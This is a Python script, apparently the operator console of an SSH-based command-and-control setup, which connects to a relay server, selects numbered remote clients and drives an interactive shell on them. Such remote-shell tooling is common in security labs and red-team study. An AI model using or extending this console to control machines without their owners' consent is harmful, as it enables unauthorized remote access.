import paramiko
import subprocess
import sys
import time
import platform
import os

#script args
server_address = sys.argv[1]
server_port = int(sys.argv[2])
username = "controller"
password = sys.argv[3]

server_session = None

def exit_server_session():
    global server_session
    try: server_session.close()
    except OSError: pass

def get_client_path():
    if server_session == None: return ""
    server_session.send("getpath")
    return server_session.recv(1024).decode('utf-8')

def shell():
    status = server_session.recv(1024).decode('utf-8')
    if status != "ready":
        print("Client Not Ready")
        return
    path = get_client_path()

    while len(path) and path != "clientdisconnected":
        command = input(f"{path}> ").strip()
        if command == "exit":
            server_session.send(command)
            return
        else:
            server_session.send(command)
            print(server_session.recv(1024).decode('utf-8'))
        path = get_client_path()

def interact():
    client_no = server_session.recv(1024).decode('utf-8')
    if client_no == "clientnotfound":
        print("Client Not Found")
        return

    while server_session.active and not server_session.closed:
        command = input(f"Client {client_no}> ").strip()
        if command == "exit":
            server_session.send(command)
            return
        elif command == "shell":
            server_session.send(command)
            shell()
        else:
            server_session.send(command)
            print(server_session.recv(1024).decode('utf-8'))

def process_commands():
    command = input("S> ").strip()
    if command == "exit":
        server_session.send(command)
        exit_server_session()
        sys.exit()
    elif command.split(" ")[0] == "interact":
        server_session.send(command)
        interact()
    else:
        server_session.send(command)
        print(server_session.recv(1024).decode('utf-8'))

#connect to the remote ssh server and recieve commands to be #executed and send back output
def ssh_command(server_address, server_port, username, password):
    global server_session
    #instantiate the ssh client
    server = paramiko.SSHClient()
    #optional is using keys instead of password auth
    #server.load_host_key('/path/to/file')
    #auto add key
    server.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #connect to ssh server
    server.connect(
        server_address,
        port=server_port,
        username=username,
        password=password
    )
    #get ssh session
    server_session = server.get_transport().open_session()
    while server_session.active and not server_session.closed:
        #wait for command, execute and send result ouput
        process_commands()
    exit_server_session()

try:
    ssh_command(server_address, server_port, username, password)
except KeyboardInterrupt:
    exit_server_session()
    sys.exit()
